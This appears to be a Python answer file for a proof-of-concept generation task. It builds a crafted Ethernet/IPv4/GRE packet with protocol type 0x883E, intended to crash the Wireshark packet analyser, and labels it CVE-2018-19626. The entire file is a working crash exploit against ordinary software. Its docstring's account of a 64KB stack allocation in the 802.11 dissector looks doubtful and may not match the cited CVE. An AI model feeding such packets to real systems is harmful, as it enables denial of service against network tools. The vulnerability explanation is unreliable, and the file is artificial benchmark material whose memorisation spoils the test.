import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers a stack exhaustion vulnerability in the
        Wireshark 802.11 dissector (CVE-2018-19626).

        The vulnerability occurs when the 802.11 dissector is invoked by the GRE
        dissector. The GRE dissector passes a 2-byte pseudo-header. The 802.11
        dissector, upon seeing this pseudo-header, allocates a 64KB buffer on
        the stack to combine it with the packet data, intending to parse it as
        a radio information header. This large stack allocation can lead to
        stack exhaustion/overflow, causing a crash.

        The PoC is a 45-byte Ethernet frame encapsulating an IP/GRE packet.
        - Ethernet (14 bytes): Sets EtherType to IPv4.
        - IP (20 bytes): Sets protocol to GRE (47).
        - GRE (4 bytes): Sets protocol type to WCCP (0x883E), which is
          configured in Wireshark to be dissected by the 802.11 dissector.
        - Payload (7 bytes): The content is arbitrary, but its length is chosen
          to meet the total PoC size of 45 bytes. A minimum of 2 bytes is
          required to pass an initial length check in the dissector.
        """

        # Ethernet Header (14 bytes)
        eth_header = (
            b'\xff\xff\xff\xff\xff\xff'  # Dst MAC: Broadcast
            b'\x00\x00\x00\x00\x00\x00'  # Src MAC
            b'\x08\x00'                  # EtherType: IPv4 (0x0800)
        )

        # IP Header (20 bytes)
        ip_total_length = 20 + 4 + 7
        ip_header_no_checksum = struct.pack(
            '!BBHHHBBH4s4s',
            0x45,                        # Version (4) | IHL (5)
            0,                           # DSCP & ECN
            ip_total_length,             # Total Length
            1,                           # Identification
            0,                           # Flags & Fragment Offset
            64,                          # TTL
            47,                          # Protocol: GRE
            0,                           # Header Checksum (placeholder)
            b'\x7f\x00\x00\x01',         # Source IP: 127.0.0.1
            b'\x7f\x00\x00\x01'          # Destination IP: 127.0.0.1
        )

        # Calculate IP checksum
        s = 0
        if len(ip_header_no_checksum) % 2 == 1:
            ip_header_no_checksum += b'\0'
        for i in range(0, len(ip_header_no_checksum), 2):
            w = (ip_header_no_checksum[i] << 8) + ip_header_no_checksum[i+1]
            s += w
        
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        checksum_val = ~s & 0xffff

        ip_header = ip_header_no_checksum[:10] + struct.pack('!H', checksum_val) + ip_header_no_checksum[12:]

        # GRE Header (4 bytes)
        gre_header = (
            b'\x00\x00'  # Flags & Version
            b'\x88\x3E'  # Protocol Type: WCCP (0x883E)
        )

        # Payload (7 bytes)
        payload = b'\x00' * 7

        # Assemble the PoC
        poc = eth_header + ip_header + gre_header + payload
        
        return poc